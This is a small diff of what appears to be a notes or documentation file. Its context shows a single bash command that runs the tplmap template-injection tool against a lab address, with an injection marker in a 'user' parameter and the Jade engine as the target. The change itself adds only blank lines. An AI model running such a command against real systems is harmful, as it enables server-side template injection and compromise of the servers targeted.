@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:23:28.896426+00:00'
 ```bash
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
 ```
+
+
